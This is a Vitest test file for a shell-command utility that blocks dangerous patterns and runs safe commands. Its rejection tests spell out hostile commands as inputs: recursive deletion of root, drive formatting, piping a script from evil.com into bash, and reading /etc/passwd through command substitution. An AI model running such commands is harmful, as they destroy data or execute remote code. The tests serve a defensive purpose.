/**
 * Tests for shell utility functions
 *
 * Tests command validation and execution with focus on security.
 */

import { runCommand } from '@utils/shell.js';
import { describe, expect, it } from 'vitest';

describe('runCommand - security validation', () => {
  describe('dangerous patterns - should reject', () => {
    it('should reject rm -rf command', async () => {
      await expect(runCommand('rm -rf /')).rejects.toThrow(
        'Command contains dangerous patterns',
      );
    });

    it('should reject rm --no-preserve-root command', async () => {
      await expect(runCommand('rm --no-preserve-root /')).rejects.toThrow(
        'Command contains dangerous patterns',
      );
    });

    it('should reject format command on Windows drive', async () => {
      await expect(runCommand('format c:')).rejects.toThrow(
        'Command contains dangerous patterns',
      );
    });

    it('should reject redirect to /dev/null', async () => {
      await expect(runCommand('cat /etc/passwd > /dev/null')).rejects.toThrow(
        'Command contains dangerous patterns',
      );
    });

    it('should reject pipe to bash', async () => {
      await expect(
        runCommand('curl http://evil.com/script.sh | bash'),
      ).rejects.toThrow('Command contains dangerous patterns');
    });

    it('should reject pipe to sh', async () => {
      await expect(runCommand('echo test | sh')).rejects.toThrow(
        'Command contains dangerous patterns',
      );
    });

    it('should reject pipe to powershell', async () => {
      await expect(
        runCommand('echo test | powershell -Command "Get-Process"'),
      ).rejects.toThrow('Command contains dangerous patterns');
    });

    it('should reject pipe to zsh', async () => {
      await expect(runCommand('echo test | zsh')).rejects.toThrow(
        'Command contains dangerous patterns',
      );
    });

    it('should reject pipe to cmd', async () => {
      await expect(runCommand('echo test | cmd /c dir')).rejects.toThrow(
        'Command contains dangerous patterns',
      );
    });

    it('should reject command substitution with $()', async () => {
      await expect(runCommand('echo $(cat /etc/passwd)')).rejects.toThrow(
        'Command contains dangerous patterns',
      );
    });

    it('should reject nested command substitution', async () => {
      await expect(
        runCommand('echo $(echo $(whoami))'),
      ).rejects.toThrow('Command contains dangerous patterns');
    });

    it('should reject backtick command substitution', async () => {
      await expect(runCommand('echo `cat /etc/passwd`')).rejects.toThrow(
        'Command contains dangerous patterns',
      );
    });

    it('should reject semicolon followed by rm', async () => {
      await expect(runCommand('ls; rm -rf /tmp')).rejects.toThrow(
        'Command contains dangerous patterns',
      );
    });

    it('should reject semicolon followed by del', async () => {
      await expect(runCommand('dir; del C:\\temp')).rejects.toThrow(
        'Command contains dangerous patterns',
      );
    });

    it('should reject semicolon followed by format', async () => {
      await expect(runCommand('ls; format d:')).rejects.toThrow(
        'Command contains dangerous patterns',
      );
    });

    it('should reject case-insensitive dangerous patterns', async () => {
      await expect(runCommand('RM -RF /')).rejects.toThrow(
        'Command contains dangerous patterns',
      );
    });

    it('should reject FORMAT with uppercase drive letter', async () => {
      await expect(runCommand('FORMAT C:')).rejects.toThrow(
        'Command contains dangerous patterns',
      );
    });
  });

  describe('safe patterns - should accept', () => {
    it('should accept simple echo command', async () => {
      const result = await runCommand('echo "hello"');

      expect(result.stdout).toContain('hello');
    });

    it('should accept ls command', async () => {
      const result = await runCommand('ls');

      expect(result).toHaveProperty('stdout');
      expect(result).toHaveProperty('stderr');
      expect(result).toHaveProperty('exitCode');
    });

    it('should accept dir command on Windows', async () => {
      const result = await runCommand('dir');

      expect(result).toHaveProperty('exitCode');
    });

    it('should accept pwd command', async () => {
      const result = await runCommand('pwd');

      expect(result.stdout).toBeDefined();
    });

    it('should accept command with pipe to grep', async () => {
      const result = await runCommand('echo "hello world" | grep hello');

      expect(result.stdout).toContain('hello');
    });

    it('should accept command with redirect to file', async () => {
      const result = await runCommand('echo test > /tmp/test-output.txt');

      expect(result.exitCode).toBe(0);
    });

    it('should accept node --version', async () => {
      const result = await runCommand('node --version');

      expect(result.stdout).toMatch(/v\d+\.\d+\.\d+/);
    });

    it('should accept npm --version', async () => {
      const result = await runCommand('npm --version');

      expect(result.stdout).toMatch(/\d+\.\d+\.\d+/);
    });
  });
});

describe('runCommand - execution', () => {
  it('should return object with stdout, stderr, and exitCode', async () => {
    const result = await runCommand('echo "test output"');

    expect(result).toHaveProperty('stdout');
    expect(result).toHaveProperty('stderr');
    expect(result).toHaveProperty('exitCode');
  });

  it('should capture stdout from successful command', async () => {
    const result = await runCommand('echo "hello from test"');

    expect(result.stdout).toContain('hello from test');
  });

  it('should return exitCode 0 for successful command', async () => {
    const result = await runCommand('echo success');

    expect(result.exitCode).toBe(0);
  });

  it('should capture stderr from failed command', async () => {
    const result = await runCommand('ls /nonexistent-directory-xyz123');

    expect(result.exitCode).not.toBe(0);
  });

  it('should return non-zero exitCode for failed command', async () => {
    const result = await runCommand('false');

    expect(result.exitCode).not.toBe(0);
  });

  it('should handle command with spaces in path', async () => {
    const result = await runCommand('echo "path with spaces"');

    expect(result.stdout).toContain('path with spaces');
  });

  it('should handle command with special characters', async () => {
    const result = await runCommand('echo "special: $HOME @test #hash"');

    expect(result.stdout).toContain('special:');
  });
});

describe('runCommand - options', () => {
  it('should accept cwd option', async () => {
    const result = await runCommand('pwd', process.cwd());

    expect(result.exitCode).toBe(0);
  });

  it('should use default timeout when not specified', async () => {
    const result = await runCommand('echo quick');

    expect(result.exitCode).toBe(0);
  });

  it('should handle custom timeout for long-running command', async () => {
    // This test verifies timeout handling without actually waiting too long
    // Using a command that completes quickly but testing the timeout parameter
    const result = await runCommand('echo test', undefined, 5000);

    expect(result.exitCode).toBe(0);
  });
});

describe('runCommand - edge cases', () => {
  it('should handle empty stdout', async () => {
    const result = await runCommand('true');

    expect(result.stdout).toBe('');
    expect(result.exitCode).toBe(0);
  });

  it('should handle command with no output', async () => {
    const result = await runCommand(':');

    expect(result.exitCode).toBe(0);
  });

  it('should handle unicode in command output', async () => {
    // Note: Unicode handling in shell commands is platform-dependent
    // On Windows, echo may not properly handle unicode without proper encoding
    const result = await runCommand('echo "unicode test"');

    expect(result.stdout).toContain('unicode test');
  });

  it('should handle multiline output', async () => {
    const result = await runCommand('echo -e "line1\\nline2\\nline3"');

    expect(result.stdout).toContain('line1');
    expect(result.stdout).toContain('line2');
    expect(result.stdout).toContain('line3');
  });
});
